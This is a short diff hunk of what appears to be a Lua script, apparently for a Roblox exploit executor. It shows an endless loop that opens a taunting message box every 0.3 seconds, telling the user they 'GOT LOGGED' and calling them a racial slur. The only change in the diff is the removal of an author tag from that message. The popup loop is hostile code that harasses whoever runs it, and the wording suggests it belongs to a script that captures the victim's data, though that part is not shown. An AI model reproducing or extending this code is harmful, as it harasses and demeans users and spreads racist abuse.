@@ -47,7 +47,7 @@ pcall(function()
 end)
 
 while task.wait() do
-messagebox("GET LOGGED NIGGA LOOOOL", "U GOT LOGGED BY VIO NIGGA LOSER", 0)
+messagebox("GET LOGGED NIGGA LOOOOL", "U GOT LOGGED NIGGA LOSER", 0)
     wait(0.3)
 end
 wait(5)
